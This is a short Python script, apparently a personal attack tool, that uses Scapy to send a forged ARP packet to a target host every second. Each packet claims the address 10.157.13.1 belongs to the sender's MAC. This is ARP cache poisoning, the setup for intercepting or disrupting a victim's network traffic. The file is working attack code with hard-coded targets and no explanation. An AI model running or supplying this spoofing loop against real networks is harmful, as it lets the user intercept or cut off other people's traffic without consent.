from scapy.all import *
from time import sleep

target_ip = "10.157.13.10"
#target_mac= "52:54:00:12:35:02"
target_mac= "08:00:06:99:52:31"

#target_ip = "10.157.13.33"
#target_mac= "F4:30:B9:59:BF:D4"

src_ip = "10.157.13.1"
mymac = "14:58:d0:08:e0:09"

while(True):
  
  # create arp packet
  arp_frame = ARP(
    pdst=target_ip, hwdst=target_mac, 
    psrc=src_ip, hwsrc=mymac)

  # send arp packet
  send(arp_frame)
  sleep(1)

